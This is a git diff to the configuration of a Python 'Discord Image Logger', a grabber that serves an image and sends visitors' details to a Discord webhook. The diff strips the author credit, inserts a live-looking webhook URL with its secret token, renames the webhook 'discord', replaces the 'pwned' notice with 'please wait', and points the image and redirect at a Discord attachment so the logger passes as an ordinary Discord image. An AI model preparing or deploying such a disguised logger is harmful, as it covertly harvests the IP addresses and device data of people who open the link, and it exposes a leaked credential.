@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -12,13 +9,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1405388071066669087/4huE8zbBO4384IzA4SpDlY5GPP7sBdfxrV_zV6Got3wGWoES48NuN2tXKCJMhI4k2SEC",
+    "image": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "discord", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "please wait", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -51,7 +48,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
